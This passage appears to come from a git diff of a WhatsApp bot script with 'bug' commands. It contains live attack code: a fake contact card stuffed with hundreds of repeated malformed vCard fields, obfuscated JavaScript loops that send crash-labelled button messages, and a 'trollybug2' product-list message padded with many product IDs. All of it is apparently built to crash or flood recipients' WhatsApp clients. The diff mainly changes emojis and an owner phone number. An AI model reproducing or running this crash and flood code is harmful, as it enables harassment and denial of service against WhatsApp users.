karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fakeContacts = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `🐱WH173 5P1D3R xbugbot ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:W5 BOT\nitem1.TEL:+917736807522\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 XeonBotInc.sendContact(m.chat, global.owner, fakeContacts)
 }
 }
@@ -7216,7 +7219,7 @@ if (args.length == 0) return m.reply(`Amount?\nExample ${prefix+command} 5`)
 amount = `${encodeURI(q)}`
 ydd = `${botname}`
 for (let i = 0; i < amount; i++) {
-function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage',' 50767666664','771192XPifQJ',' 50767666664','${ownername}\x20🦄?','45FHicsI','2213460MCRxLU','AH\x20EZ','350069CkDHKE','reply\x20CRASH','https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await XeonBotInc[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'JOIN\x20XEON\x20GROUP\x20CHAT','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'X\x20BUG\x20EZZZ','id':_0x47bf3a(0x153)}}]}));
+function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage',' 50767666664','771192XPifQJ',' 50767666664','${ownername}\x20🐱?','45FHicsI','2213460MCRxLU','AH\x20EZ','350069CkDHKE','reply\x20CRASH','https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await XeonBotInc[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'JOIN\x20XEON\x20GROUP\x20CHAT','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'X\x20BUG\x20EZZZ','id':_0x47bf3a(0x153)}}]}));
  await sleep(20)
 }
 }
@@ -7229,7 +7232,7 @@ if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${
 amount = `${encodeURI(q)}`
 ydd = `${botname}`
 for (let i = 0; i < amount; i++) {
-let teks = `══✪〘 * TAGALL LMAO 🦄* 〙✪══
+let teks = `══✪〘 * TAGALL LMAO 🐱* 〙✪══
  ${themeemoji} *Message : ${q ? q : 'empty'}*\n\n`
 for (let mem of participants) {
 teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
@@ -7296,7 +7299,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "retailerId": wm,
 "url": websitex
 },
-"businessOwnerJid": "916909137213@s.whatsapp.net",
+"businessOwnerJid": "917736807522@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: doc })
 XeonBotInc.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -7309,7 +7312,7 @@ case 'trollybug2': {
                 if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','Xeon\x20Bug\x20WhatsApp','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt',' 916909137213@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await XeonBotInc[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':xpicvirus}}};var xeonordy=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+xeonbutton2,'description':_0x588892(0x1fc)+xeonbutton2,'thumbnail':xpicvirus,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+xeonbutton2,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x2